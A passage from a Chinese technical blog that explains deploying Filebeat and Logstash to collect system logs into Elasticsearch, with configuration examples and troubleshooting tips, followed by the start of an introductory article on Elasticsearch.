no-store, must-revalidate<br><span class="hljs-params">content-length:</span> <span class="hljs-number">0</span><br><span class="hljs-params">Date:</span> Thu, <span class="hljs-number">09</span> Jan <span class="hljs-number">2025</span> <span class="hljs-number">05</span>:<span class="hljs-number">51</span>:<span class="hljs-number">05</span> GMT<br><span class="hljs-params">Connection:</span> keep-alive<br><span class="hljs-params">Keep-Alive:</span> timeout<span class="hljs-operator">=</span><span class="hljs-number">120</span><br></code></pre></td></tr></table></figure><h3 id="部署filebeat"><a href="#部署filebeat" class="headerlink" title="部署filebeat"></a>部署filebeat</h3><p><img src="https://gitee.com/ljh00928/csdn/raw/master/img/5ade8e793739408487a70a3943757ab7.png"></p><figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs autoit"><span class="hljs-number">1.</span>下载<br>[root<span class="hljs-symbol">@node1</span>.<span class="hljs-keyword">local</span> ~]<span class="hljs-meta"># wget https://artifacts.elastic.co/downloads/beats/filebeat/filebeat-7.17.22-amd64.deb</span><br><br><span class="hljs-number">2.</span>安装<br>[root<span class="hljs-symbol">@node1</span>.<span class="hljs-keyword">local</span> ~]<span class="hljs-meta"># dpkg -i filebeat-7.17.22-amd64.deb</span><br><br><span class="hljs-number">3.</span>验证是否安装成功<br>[root<span class="hljs-symbol">@node1</span>.<span class="hljs-keyword">local</span> ~]<span class="hljs-meta"># filebeat -h</span><br></code></pre></td></tr></table></figure><p><strong>filebeat组成部分</strong></p><blockquote><p>input:数据从哪里来？<br> output：数据去哪里？</p></blockquote><p><strong>filebeat结构</strong></p><blockquote><p>- input: 数据从哪来？<br>   - stdin<br>   - tcp<br>   - log</p><p> - output: 数据到哪去？<br>   - console<br>   - elasticsearch</p></blockquote><h1 id="五、测试"><a href="#五、测试" class="headerlink" title="五、测试"></a>五、测试</h1><p>定义filebeat采集的日志索引模板</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs yaml">[<span class="hljs-string">root@node1.local</span> <span class="hljs-string">filebeat</span>]<span class="hljs-comment"># vim systemlog.yaml </span><br><span class="hljs-attr">filebeat.inputs:</span><br><span class="hljs-bullet">-</span> <span class="hljs-attr">type:</span> <span class="hljs-string">log</span><br>  <span class="hljs-attr">paths:</span><br>    <span class="hljs-bullet">-</span> <span class="hljs-string">/var/log/*.log</span><br><br><span class="hljs-attr">output.elasticsearch:</span><br>  <span class="hljs-attr">hosts:</span><br>  <span class="hljs-bullet">-</span> <span class="hljs-string">&quot;http://192.1.7.244:9200&quot;</span><br>  <span class="hljs-attr">index:</span> <span class="hljs-string">&quot;system-log&quot;</span><br><br><span class="hljs-comment"># 禁用索引的生命周期(Index Lifecycle Management,简称&quot;ilm&quot;)，如果不禁用则忽略自定义索引名称</span><br><span class="hljs-attr">setup.ilm.enabled:</span> <span class="hljs-literal">false</span><br><span class="hljs-comment"># ES的索引模板名称</span><br><span class="hljs-attr">setup.template.name:</span> <span class="hljs-string">&quot;system&quot;</span><br><span class="hljs-comment"># ES索引模板的匹配模式</span><br><span class="hljs-attr">setup.template.pattern:</span> <span class="hljs-string">&quot;system-log*&quot;</span><br><span class="hljs-comment"># 如果索引模板已经存在，是否覆盖，推荐设置为false</span><br><span class="hljs-attr">setup.template.overwrite:</span> <span class="hljs-literal">false</span><br><span class="hljs-comment"># 设置索引模板</span><br><span class="hljs-attr">setup.template.settings:</span><br>  <span class="hljs-comment"># 设置索引的分片数量</span><br>  <span class="hljs-attr">index.number_of_shards:</span> <span class="hljs-number">5</span><br>  <span class="hljs-comment"># 设置索引的副本数量</span><br>  <span class="hljs-attr">index.number_of_replicas:</span> <span class="hljs-number">0</span><br></code></pre></td></tr></table></figure><p><strong>执行filebeat采集日志</strong></p><figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs autoit">[root<span class="hljs-symbol">@node1</span>.<span class="hljs-keyword">local</span> filebeat]<span class="hljs-meta"># filebeat -e -c /root/filebeat/systemlog.yaml </span><br></code></pre></td></tr></table></figure><p><strong>查看索引</strong> </p><p><img src="https://gitee.com/ljh00928/csdn/raw/master/img/89899c03a9b041cfaf7b981f14cbe78a.png" alt="89899c03a9b041cfaf7b981f14cbe78a.png"></p><p><strong>添加索引</strong> </p><p><img src="https://gitee.com/ljh00928/csdn/raw/master/img/b5b5a1444258447baeedc342957cc623.png" alt="b5b5a1444258447baeedc342957cc623.png"></p><p><strong>查看日志</strong> </p><p><img src="https://gitee.com/ljh00928/csdn/raw/master/img/3e9aa0ea8f8e41a7b0154f7afe40e9ef.png" alt="3e9aa0ea8f8e41a7b0154f7afe40e9ef.png"></p><h1 id="六、logstash"><a href="#六、logstash" class="headerlink" title="六、logstash"></a>六、logstash</h1><p>filebeat是基于logstash再次开发的，logstash可以对自己公司自研产品进行自定义日志，选择要截取的日志。</p><p>Logstash 是一个具有实时管道功能的开源数据收集引擎。Logstash可以动态统一来自不同来源的数据，并将数据规范化到您选择的目标中。为了多样化的高级下游分析和可视化用例，清理和使所有数据平等化。</p><p>虽然 Logstash 最初在日志收集方面推动了创新，但它的能力远远超出了该用例。任何类型的事件都可以通过广泛的输入、过滤和输出插件进行增强和转换，许多本地编解码器进一步简化了摄入过程。Logstash 通过利用更多的数据量和种类加速您的洞察力。</p><p><strong>工作原理</strong></p><p>Logstash 事件处理管道有三个阶段：<strong>输入 → 过滤器 → 输出</strong>。</p><p>inputs 模块负责收集数据，filters 模块可以对收集到的数据进行格式化、过滤、简单的数据处理，outputs 模块负责将数据同步到目的地，Logstash的处理流程，就像管道一样，数据从管道的一端，流向另外一端。</p><p>inputs 和 outputs 支持编解码器，使您能够在数据进入或离开管道时对数据进行编码或解码，而无需使用单独的过滤器。</p><p><img src="https://gitee.com/ljh00928/csdn/raw/master/img/27f6c2a9e55249deb6c91357a5cccb3e.png" alt="27f6c2a9e55249deb6c91357a5cccb3e.png"></p><p><strong>部署logstash</strong></p><figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs swift"><span class="hljs-number">1</span>.下载logstash<br>[root<span class="hljs-meta">@node1</span>.local <span class="hljs-operator">~</span>]#  wget https:<span class="hljs-comment">//artifacts.elastic.co/downloads/logstash/logstash-7.17.22-amd64.deb</span><br><br><span class="hljs-number">2</span>.安装logstash<br>[root<span class="hljs-meta">@node1</span>.local <span class="hljs-operator">~</span>]#  dpkg <span class="hljs-operator">-</span>i logstash<span class="hljs-operator">-</span><span class="hljs-number">7.17</span>.<span class="hljs-number">22</span><span class="hljs-operator">-</span>amd64.deb<br><br><span class="hljs-number">3</span>.配置环境变量<br>[root<span class="hljs-meta">@node1</span>.local <span class="hljs-operator">~</span>]#  ln <span class="hljs-operator">-</span>svf <span class="hljs-regexp">/usr/</span>share<span class="hljs-regexp">/logstash/</span>bin<span class="hljs-regexp">/logstash /</span>usr<span class="hljs-regexp">/local/</span>sbin<span class="hljs-operator">/</span><br>&#x27;<span class="hljs-regexp">/usr/</span>local<span class="hljs-regexp">/sbin/</span>logstash&#x27; -&gt; &#x27;<span class="hljs-regexp">/usr/</span>share<span class="hljs-regexp">/logstash/</span>bin<span class="hljs-operator">/</span>logstash&#x27;<br></code></pre></td></tr></table></figure><p><strong>logstash结构</strong></p><blockquote><p>- pipeline<br>   - input<br>   - stdin<br>   - file<br> - filter<br>   - mutate<br> - output<br>   - stdout<br>   - elasticsearch</p></blockquote><p><strong>fileter插件</strong></p><blockquote><p>grok：logstash 中最常用的日志解释和结构化插件。</p><p>grok ：是一种采用组合多个预定义的正则表达式，用来匹配分割文本并映射到关键字的工具。<br> mutate ：支持事件的变换，例如重命名、移除、替换、修改等</p><p>drop ：完全丢弃事件</p><p>clone ：克隆事件</p><p>geoip：添加关于 IP 地址的地理位置信息</p><p>date：专门用于处理日志的日期模块，将其作为时间戳可以替换”@timestamp”字段。</p></blockquote><p><strong>案例编写</strong></p><figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><code class="hljs livescript">[root@node1.local conf.d]<span class="hljs-comment"># vim 03-file-filter-elasticsearch.conf </span><br>input &#123;<br>  <span class="hljs-comment"># 输入类型是一个file，代表的是文本文件</span><br>  file &#123;<br>    <span class="hljs-comment"># 指定的文件的路径，可以指定多个</span><br>    path =&gt; [<span class="hljs-string">&quot;/var/log/*.log&quot;</span>]<br>    <span class="hljs-comment"># 指定从源文件采集的位置，有效值为: beginning, end(默认值)。</span><br>    <span class="hljs-comment"># 该参数仅在首次采集(没有在&quot;.sincedb*&quot;文件中记录)新文件时生效，第二次采集则无视此参数。</span><br>    start_position =&gt; <span class="hljs-string">&quot;beginning&quot;</span><br>  &#125;<br>&#125;<br><br>filter &#123;<br>  mutate &#123;<br>      <span class="hljs-comment"># 对指定字段进行切分，本案例是将message字段按照&quot;|&quot;进行切分</span><br>      split =&gt; &#123; <span class="hljs-string">&quot;message&quot;</span> =&gt; <span class="hljs-string">&quot;|&quot;</span> &#125;<br><br>      <span class="hljs-comment"># 添加字段</span><br>      add_field =&gt; &#123; <br>         <span class="hljs-string">&quot;other&quot;</span> =&gt; <span class="hljs-string">&quot;%&#123;[message][0]&#125;&quot;</span><br>         <span class="hljs-string">&quot;userId&quot;</span> =&gt; <span class="hljs-string">&quot;%&#123;[message][1]&#125;&quot;</span> <br>         <span class="hljs-string">&quot;action&quot;</span> =&gt; <span class="hljs-string">&quot;%&#123;[message][2]&#125;&quot;</span><br>         <span class="hljs-string">&quot;svip&quot;</span> =&gt; <span class="hljs-string">&quot;%&#123;[message][3]&#125;&quot;</span><br>         <span class="hljs-string">&quot;price&quot;</span> =&gt; <span class="hljs-string">&quot;%&#123;[message][4]&#125;&quot;</span> <br><br>      &#125;<br>  &#125;<br><br>  mutate &#123;<br>      split =&gt; &#123; <span class="hljs-string">&quot;other&quot;</span> =&gt; <span class="hljs-string">&quot; &quot;</span>&#125;<br>      add_field =&gt; &#123;<br>         datetime =&gt; <span class="hljs-string">&quot;%&#123;[other][1]&#125; %&#123;[other][2]&#125;&quot;</span><br>      &#125;<br><br>      <span class="hljs-comment"># 移除字段</span><br>      remove_field =&gt; [ <span class="hljs-string">&quot;message&quot;</span> , <span class="hljs-string">&quot;other&quot;</span>, <span class="hljs-string">&quot;@version&quot;</span>]<br>  &#125;<br><br><br>  mutate &#123;<br>     <span class="hljs-comment"># 对字段进行数据转换</span><br>     convert =&gt; &#123;<br>       <span class="hljs-string">&quot;price&quot;</span> =&gt; <span class="hljs-string">&quot;float&quot;</span><br>       <span class="hljs-string">&quot;userId&quot;</span> =&gt; <span class="hljs-string">&quot;integer&quot;</span><br>     &#125;<br>  &#125;<br><br><br>   <span class="hljs-comment"># 处理时间相关的模块</span><br>   date &#123;<br>     <span class="hljs-comment"># 匹配日期字段，将&quot;datetime&quot; 转换为日期格式</span><br>     <span class="hljs-comment">#    源数据： &quot;datetime&quot; =&gt; &quot;2024-07-16 10:34:39&quot;</span><br>     match =&gt; [ <span class="hljs-string">&quot;datetime&quot;</span>, <span class="hljs-string">&quot;yyyy-MM-dd HH:mm:ss&quot;</span> ]<br><br>     <span class="hljs-comment"># 使用match匹配到的时间数据类型存储在哪个字段中，若不指定，则默认使用覆盖&quot;@timestamp&quot;</span><br>     <span class="hljs-comment"># target =&gt; &quot;datetime&quot;</span><br>   &#125;<br><br><br>&#125;<br><br>output &#123;<br>  stdout &#123;&#125;<br><br> elasticsearch &#123;<br>    <span class="hljs-comment"># 指定ES集群地址</span><br>    hosts =&gt; [<span class="hljs-string">&quot;http://192.1.7.244:9200&quot;</span>]<br>    <span class="hljs-comment"># 指定ES自定义索引的名称</span><br>    index =&gt; <span class="hljs-string">&quot;system-%&#123;+yyyy.MM.dd&#125;&quot;</span><br> &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p> <strong>启动logstash实例</strong></p><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stata">[root@node1.<span class="hljs-keyword">local</span> ~]#  logstash -rf /etc/logstash/<span class="hljs-keyword">conf</span>.<span class="hljs-keyword">d</span>/03-<span class="hljs-keyword">file</span>-filter-elasticsearch.<span class="hljs-keyword">conf</span><br></code></pre></td></tr></table></figure><p><img src="https://gitee.com/ljh00928/csdn/raw/master/img/5bcd72e718c142c0a1cd2f9eca041d40.png" alt="5bcd72e718c142c0a1cd2f9eca041d40.png"></p><p><strong>kibana查看索引</strong></p><p><img src="https://gitee.com/ljh00928/csdn/raw/master/img/da51a954f4b244cabd5180a97cedf398.png" alt="da51a954f4b244cabd5180a97cedf398.png"></p><p><strong>创建索引</strong></p><p><img src="https://gitee.com/ljh00928/csdn/raw/master/img/8fdb73bd47414486b46efcb9f324d2cd.png" alt="8fdb73bd47414486b46efcb9f324d2cd.png"></p><p><strong>查看日志数据</strong></p><p>很明显，相对于filebeat来说。logstash这时候已经精准过滤出我们需要的字段了</p><p><img src="https://gitee.com/ljh00928/csdn/raw/master/img/1b492473f66f4d6cbe1512f88d24c6ff.png" alt="1b492473f66f4d6cbe1512f88d24c6ff.png"></p><h1 id="七、常见问题及解决方案"><a href="#七、常见问题及解决方案" class="headerlink" title="七、常见问题及解决方案"></a>七、常见问题及解决方案</h1><p><strong>问题：如何实现日志的多行合并功能？</strong></p><p>系统应用中的日志一般都是以特定格式进行打印的，属于同一条日志的数据可能分多行进行打印，那么在使用 ELK 收集日志的时候就需要将属于同一条日志的多行数据进行合并。</p><p>解决方案：使用 Filebeat 或 Logstash 中的 multiline 多行合并插件来实现</p><p>在使用 multiline 多行合并插件的时候需要注意，不同的 ELK 部署架构可能 multiline 的使用方式也不同，如果是本文的第一种部署架构，那么 multiline 需要在 Logstash 中配置使用，如果是第二种部署架构，那么 multiline 需要在 Filebeat 中配置使用，无需再在 Logstash 中配置 multiline。</p><p><strong>1、multiline 在 Filebeat 中的配置方式：</strong></p><p><img src="https://gitee.com/ljh00928/csdn/raw/master/img/c5e5bf831c80439592004b44b09a6836.png" alt="c5e5bf831c80439592004b44b09a6836.png"></p><blockquote><ul><li>negate：默认为 false，表示匹配 pattern 的行合并到上一行；true 表示不匹配 pattern 的行合并到上一行</li><li>match：after 表示合并到上一行的末尾，before 表示合并到上一行的行首</li></ul></blockquote><p>如：该配置表示将不匹配 pattern 模式的行合并到上一行的末尾</p><figure class="highlight vbnet"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs vbnet"><span class="hljs-symbol">pattern:</span> <span class="hljs-comment">&#x27;\[&#x27;</span><br><span class="hljs-symbol">negate:</span> <span class="hljs-literal">true</span><br><span class="hljs-symbol">match:</span> after<br></code></pre></td></tr></table></figure><p><strong>2、multiline 在 Logstash 中的配置方式</strong></p><p><img src="https://gitee.com/ljh00928/csdn/raw/master/img/c0f265a20f22429688c3db433c48de05.png" alt="c0f265a20f22429688c3db433c48de05.png"></p><blockquote><p>（1）Logstash 中配置的 what 属性值为 previous，相当于 Filebeat 中的 after，Logstash 中配置的 what 属性值为 next，相当于 Filebeat 中的 before。<br> （2）pattern &#x3D;&gt; “%{LOGLEVEL}\s*]“ 中的 LOGLEVEL 是 Logstash 预制的正则匹配模式，预制的还有好多常用的正则匹配模式，详细请看：<a href="https://github.com/logstash-plugins/logstash-patterns-core/tree/master/patterns">https://github.com/logstash-plugins/logstash-patterns-core/tree/master/patterns</a> </p></blockquote><p><strong>问题：如何将 Kibana 中显示日志的时间字段替换为日志信息中的时间？</strong> </p><p>默认情况下，我们在 Kibana 中查看的时间字段与日志信息中的时间不一致，因为默认的时间字段值是日志收集时的当前时间，所以需要将该字段的时间替换为日志信息中的时间。</p><p><strong>解决方案：使用 grok 分词插件与 date 时间格式化插件来实现</strong></p><p>在 Logstash 的配置文件的过滤器中配置 grok 分词插件与 date 时间格式化插件，如：</p><p><img src="https://gitee.com/ljh00928/csdn/raw/master/img/37091060f3d441b384738b4655ec0297.png" alt="37091060f3d441b384738b4655ec0297.png"></p><p>如要匹配的日志格式为：“[DEBUG][20170811 10:07:31,359][DefaultBeanDefinitionDocumentReader:106] Loading bean definitions”，解析出该日志的时间字段的方式有：</p><p>① 通过引入写好的表达式文件，如表达式文件为 customer_patterns，内容为：<br> CUSTOMER_TIME %{YEAR}%{MONTHNUM}%{MONTHDAY}\s+%{TIME}<br> 注：内容格式为：[自定义表达式名称] [正则表达式]<br> 然后 logstash 中就可以这样引用：</p><p><img src="https://gitee.com/ljh00928/csdn/raw/master/img/f4a603385f984c268b4171c088fa516b.png" alt="f4a603385f984c268b4171c088fa516b.png"></p><p> ② 以配置项的方式，规则为：(?&lt; 自定义表达式名称&gt; 正则匹配规则)，如：</p><figure class="highlight fsharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs fsharp"><span class="hljs-keyword">filter</span> &#123;  <br>  <span class="hljs-keyword">grok</span> &#123;    <br>    <span class="hljs-keyword">match</span> <span class="hljs-operator">=&gt;</span> [ <span class="hljs-string">&quot;message&quot;</span> , <span class="hljs-string">&quot;(?&lt;customer_time&gt;%&#123;YEAR&#125;%&#123;MONTHNUM&#125;%&#123;MONTHDAY&#125;\s+%&#123;TIME&#125;)&quot;</span> ]  <br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>问题：如何在 Kibana 中通过选择不同的系统日志模块来查看数据</strong></p><p> 一般在 Kibana 中显示的日志数据混合了来自不同系统模块的数据，那么如何来选择或者过滤只查看指定的系统模块的日志数据？</p><p><strong>解决方案：新增标识不同系统模块的字段或根据不同系统模块建 ES 索引</strong></p><p>1、新增标识不同系统模块的字段，然后在 Kibana 中可以根据该字段来过滤查询不同模块的数据</p><p>这里以第二种部署架构讲解，在 Filebeat 中的配置内容为：</p><p><img src="https://gitee.com/ljh00928/csdn/raw/master/img/ddf6958c25a4490795f9de0d0e29b836.png" alt="ddf6958c25a4490795f9de0d0e29b836.png"></p><blockquote><p>通过新增：log_from 字段来标识不同的系统模块日志 </p></blockquote><p>2、根据不同的系统模块配置对应的 ES 索引，然后在 Kibana 中创建对应的索引模式匹配，即可在页面通过索引模式下拉框选择不同的系统模块数据。<br> 这里以第二种部署架构讲解，分为两步：</p><p>① 在 Filebeat 中的配置内容为：</p><p><img src="https://gitee.com/ljh00928/csdn/raw/master/img/f0aa2ef6423d4e0887d40b3fb593c541.png" alt="f0aa2ef6423d4e0887d40b3fb593c541.png"></p><blockquote><p>通过 document_type 来标识不同系统模块</p></blockquote><p> ② 修改 Logstash 中 output 的配置内容为：</p><p><img src="https://gitee.com/ljh00928/csdn/raw/master/img/ddcb22d3baf34114b02bb12476ddf1c5.png" alt="ddcb22d3baf34114b02bb12476ddf1c5.png"></p><blockquote><p>在 output 中增加 index 属性，%{type} 表示按不同的 document_type 值建 ES 索引</p></blockquote>]]></content>
    
    
    <categories>
      
      <category>日志篇</category>
      
    </categories>
    
    
    <tags>
      
      <tag>日志篇</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Elasticsearch入门篇</title>
    <link href="/2025/04/16/Elasticsearch%E5%85%A5%E9%97%A8%E7%AF%87/"/>
    <url>/2025/04/16/Elasticsearch%E5%85%A5%E9%97%A8%E7%AF%87/</url>
    
    <content type="html"><![CDATA[<h1 id="1-介绍-Elasticsearch"><a href="#1-介绍-Elasticsearch" class="headerlink" title="1.介绍 Elasticsearch"></a><strong>1.介绍 Elasticsearch</strong></h1><h2 id="1-1-什么是-Elasticsearch？"><a href="#1-1-什么是-Elasticsearch？" class="headerlink" title="1.1.什么是 Elasticsearch？"></a>1.1.什么是 Elasticsearch？</h2><p>Elasticsearch 是一种开源的搜索和分析引擎，专门用于处理<strong>大规模的数据</strong>，并以非常快的速度进行搜索和分析。它基于一个叫做 Apache Lucene 的库构建，但与 Lucene 相比，Elasticsearch 提供了更多的功能和易用性，使其成为处理和分析数据的强大工具。</p><h3 id="1-1-1-简单理解-Elasticsearch"><a href="#1-1-1-简单理解-Elasticsearch" class="headerlink" title="1.1.1.简单理解 Elasticsearch"></a>1.1.1.简单理解 Elasticsearch</h3><p>想象一下，你有一大堆书，而你需要在这些书中找到某个特定的词或一句话。如果你逐页翻阅，这将是一个非常耗时的过程。Elasticsearch 就像一个超级快速的图书馆管理员，它能在瞬间找到你想要的内容，不管这些书有多少。</p><h3 id="1-1-2-核心概念"><a href="#1-1-2-核心概念" class="headerlink" title="1.1.2.核心概念"></a>1.1.2.核心概念</h3><ol><li>开源与分布式<ul><li>开源：Elasticsearch 是开源的，这意味着它的代码是公开的，任何人都可以使用和修改它。开源社区的力量使得 Elasticsearch 不断改进和更新。</li><li>分布式：Elasticsearch 能够运行在多台服务器上，并把数据分布存储在这些服务器上。这种设计使它能够处理非常大的数据集，并且即使一台服务器出现问题，其他服务器仍然可以继续工作。</li></ul></li><li>基于 Apache Lucene<ul><li>Lucene 是一个非常强大的搜索库，但直接使用 Lucene 需要编写大量代码。Elasticsearch 使 Lucene 变得更容易使用，提供了一个简单的接口和许多额外的功能，使构建搜索和分析应用程序变得更加简单。</li></ul></li><li>近实时（Near Real-Time）搜索<ul><li>Elasticsearch 的一个重要特点是它的近实时搜索能力。当数据被存储到 Elasticsearch 中后，几乎立即就可以被搜索到。这对需要处理和分析实时数据的应用非常有用，比如日志监控系统。</li></ul></li></ol><h4 id="1-1-2-1-主要功能"><a href="#1-1-2-1-主要功能" class="headerlink" title="1.1.2.1.主要功能"></a>1.1.2.1.主要功能</h4><ol><li>全文搜索<ul><li>Elasticsearch 能够快速高效地处理全文搜索。这意味着它不仅仅能够搜索关键词，还能处理复杂的查询，比如匹配短语、布尔查询（与或非）、范围查询等。</li></ul></li><li>数据分析<ul><li>除了搜索，Elasticsearch 还能够对数据进行深入分析。它提供了强大的聚合功能，允许你进行各种统计分析，比如求平均值、最大值、最小值、分布情况等。</li></ul></li><li>实时数据处理<ul><li>Elasticsearch 可以处理和分析实时数据。这使得它非常适合用于日志分析和监控系统。通过与其他工具（如 Beats 和 Logstash）的集成，可以从各种数据源收集数据，并实时发送到 Elasticsearch 进行分析。</li></ul></li><li>扩展性和高可用性<ul><li>由于其分布式架构，Elasticsearch 可以轻松扩展以处理更多的数据和查询负载。你只需增加更多的服务器节点，就能提升其处理能力。此外，Elasticsearch 通过分片和副本机制确保数据的高可用性和容错能力。</li></ul></li></ol><h3 id="1-1-3-应用场景"><a href="#1-1-3-应用场景" class="headerlink" title="1.1.3.应用场景"></a>1.1.3.应用场景</h3><ol><li>日志和事件数据分析<ul><li>Elasticsearch 经常用于收集和分析日志数据。通过与 Kibana（一个可视化工具）的结合，可以创建直观的仪表盘，帮助用户实时监控和分析系统日志，快速发现和解决问题。</li></ul></li><li>全文搜索<ul><li>许多网站和应用程序使用 Elasticsearch 作为其搜索引擎，提供快速和精准的全文搜索功能。例如，电商网站可以使用 Elasticsearch 让用户快速找到他们想要购买的商品。</li></ul></li><li>监控和安全分析<ul><li>Elasticsearch 也用于实时监控和安全分析。通过收集和分析系统日志、网络流量等数据，可以实时监控系统运行状态，并检测和响应潜在的安全威胁。</li></ul></li><li>数据存储和检索<ul><li>除了搜索和分析，Elasticsearch 还可以作为一个高效的数据存储和检索系统，特别适合需要快速访问的大规模数据集。</li></ul></li></ol><h2 id="1-2-为什么选择-Elasticsearch？"><a href="#1-2-为什么选择-Elasticsearch？" class="headerlink" title="1.2.为什么选择 Elasticsearch？"></a>1.2.为什么选择 Elasticsearch？</h2><p>Elasticsearch 是一个<strong>强大的搜索和分析引擎</strong>，广泛应用于各种场景。它的受欢迎程度源于其诸多优势和特点，使其成为许多企业和开发者在<strong>处理大规模数据和实时搜索需求时的首选</strong>。下面，我们将详细介绍为什么选择 Elasticsearch 以及它的主要优点。</p><h3 id="1-2-1-快速的全文搜索能力"><a href="#1-2-1-快速的全文搜索能力" class="headerlink" title="1.2.1 快速的全文搜索能力"></a>1.2.1 快速的全文搜索能力</h3><p>Elasticsearch 基于 Apache Lucene 构建，具备<strong>极快的全文搜索能力</strong>。这意味着无论是查找单个关键词、短语，还是执行复杂的布尔查询，Elasticsearch 都能够迅速返回结果。这对需要处理大量文本数据的应用场景非常重要，比如：</p><ul><li><strong>电商网站</strong>：快速查找商品并提供精准的搜索结果，提高用户体验。</li><li><strong>内容管理系统</strong>：高效地检索文章、博客和文档中的信息。</li></ul><h3 id="1-2-2-实时数据处理"><a href="#1-2-2-实时数据处理" class="headerlink" title="1.2.2. 实时数据处理"></a>1.2.2. 实时数据处理</h3><p>Elasticsearch 的近<strong>实时搜索能力使其非常适合处理实时数据</strong>。这意味着当新数据被存储到 Elasticsearch 中后，几乎立即就可以被搜索和分析。这一特点在以下场景中尤为关键：</p><ul><li><strong>日志和监控系统</strong>：实时分析系统日志，快速发现和解决问题。</li><li><strong>安全监控</strong>：实时监测和分析安全事件，及时检测和响应潜在威胁。</li></ul><h3 id="1-2-3-分布式架构和可扩展性"><a href="#1-2-3-分布式架构和可扩展性" class="headerlink" title="1.2.3. 分布式架构和可扩展性"></a>1.2.3. 分布式架构和可扩展性</h3><p>Elasticsearch 的分布式设计使其<strong>能够在多个服务器节点上运行</strong>，并将数据分布存储在这些节点上。这种架构带来了巨大的扩展性和容错能力：</p><ul><li><strong>扩展性</strong>：随着数据量和查询量的增加，可以通过添加更多节点来线性扩展系统的存储和处理能力。</li><li><strong>高可用性</strong>：即使某个节点出现故障，其他节点仍然可以继续工作，确保系统的持续运行。</li></ul><h3 id="1-2-4-强大的数据分析功能"><a href="#1-2-4-强大的数据分析功能" class="headerlink" title="1.2.4. 强大的数据分析功能"></a>1.2.4. 强大的数据分析功能</h3><p>除了搜索，Elasticsearch 还提供了<strong>强大的数据分析能力</strong>。通过聚合功能，可以对数据进行复杂的统计分析。这对需要从大量数据中提取有价值信息的场景非常有用：</p><ul><li>数据分析：计算平均值、最大值、最小值、分布情况等，帮助做出数据驱动的决策。</li><li><strong>商业智能</strong>：分析用户行为、销售数据等，为业务发展提供洞察。</li></ul><h3 id="1-2-5-易用的-RESTful-API"><a href="#1-2-5-易用的-RESTful-API" class="headerlink" title="1.2.5. 易用的 RESTful API"></a><strong>1.2.5. 易用的 RESTful API</strong></h3><p>Elasticsearch 提供了<strong>丰富的 RESTful API</strong>，使得与其交互变得非常简单。<strong>无论是索引数据、执行搜索查询，还是进行集群管理，都可以通过简单的 HTTP 请求完成</strong>。这对于开发者来说，非常友好：</p><ul><li><strong>开发便捷</strong>：无需复杂的设置和配置，通过简单的 API 调用即可实现强大的功能。</li><li><strong>集成简单</strong>：容易与其他系统和应用集成，例如使用 Logstash 收集数据、使用 Kibana 进行数据可视化。</li></ul><h3 id="1-2-6-活跃的社区和丰富的生态系统"><a href="#1-2-6-活跃的社区和丰富的生态系统" class="headerlink" title="1.2.6. 活跃的社区和丰富的生态系统"></a>1.2.6. 活跃的社区和丰富的生态系统</h3><p>Elasticsearch 是一个开源项目，<strong>拥有一个非常活跃的社区</strong>。你可以从社区获得大量的支持和资源，包括文档、教程、插件等。此外，Elasticsearch 